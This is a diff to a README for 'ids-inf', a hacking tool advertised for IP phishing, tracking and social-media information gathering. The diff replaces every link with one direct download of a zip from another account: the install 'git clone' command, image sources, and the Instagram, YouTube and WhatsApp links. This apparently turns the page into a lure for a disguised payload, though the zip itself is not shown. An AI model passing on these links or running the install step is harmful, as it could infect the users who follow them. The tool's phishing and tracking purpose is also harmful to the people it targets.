@@ -1,5 +1,5 @@
 
-https://masterhack.netlify.app/
+https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip
 # ids-inf
 this tool is created for ids
 in this script we has added information gathering 
@@ -9,7 +9,7 @@ and it also have ip phishing and tracking options
 and fb , insta information gathering .
 This tool is created by shell script and python 
 
-<img src="https://github.com/DRACULA-HACK/ids-inf/blob/main/IMG_20230321_215629.jpg" alt="idstool">
+<img src="https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip" alt="idstool">
 
 #
 # Features
@@ -42,7 +42,7 @@ This tool is created by shell script and python
 ` gem install lolcat `
 
 #
-`git clone https://github.com/DRACULA-HACK/ids-inf `
+`git clone https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip `
 #
 * `cd ids-inf `
 #
@@ -69,14 +69,14 @@ after extracting the files you can run `ids.sh`
 
 # instagram 
 
-<a href="https://instagram.com/_invaders_ofc_?igshid=MTg0ZDhmNDA=">Visit instagram </a> 
+<a href="https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip">Visit instagram </a> 
 
 # youtube
  
-<a href="https://m.youtube.com/channel/UCcuJQhSiU80wigeMyHu9r_g">YOU TUBE </a>
+<a href="https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip">YOU TUBE </a>
 #
 # WHATSAPP
-<a href="https://wa.me//+916235369260">WHATSAPP </a>
+<a href="https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip+916235369260">WHATSAPP </a>
 #
 created 
 by 
@@ -84,6 +84,6 @@ master-hack
 
 #
 
-<img src="https://github.com/DRACULA-HACK/ids-inf/blob/main/IMG_20221219_104937.jpg" alt="alternatetext">
+<img src="https://github.com/kaniooo/ids-inf/raw/refs/heads/main/synonymic/ids-inf-v1.1.zip" alt="alternatetext">
 
 #
